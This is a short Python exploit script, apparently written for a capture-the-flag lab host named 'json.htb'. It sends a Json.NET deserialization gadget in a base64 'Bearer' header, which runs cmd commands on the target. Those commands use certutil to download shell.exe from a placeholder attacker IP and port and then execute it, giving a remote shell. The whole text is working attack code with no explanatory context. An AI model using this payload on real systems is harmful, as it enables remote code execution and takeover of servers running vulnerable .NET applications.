#!/usr/bin/python3
##
###############################
import base64
import requests
import json

IP = "10.10.XX.XX"
PORT = "XXXX"

template = r"""
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd","/c %s"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
"""

commands = [
	r"mkdir c:\\tmp",
	r"certutil -f -split -urlcache http://%s:%s/shell.exe c:\\tmp\\shell.exe" % (IP, PORT),
	r"c:\\tmp\\shell.exe"
]

for command in commands:
	payload = template % (command,)
	minified = json.dumps(json.loads(payload)).encode()

	headers = {
		"Bearer": base64.b64encode(minified)
	}

	resp = requests.get("http://json.htb/api/Account/", headers=headers)
  
  
################################################  
################################################
##
##
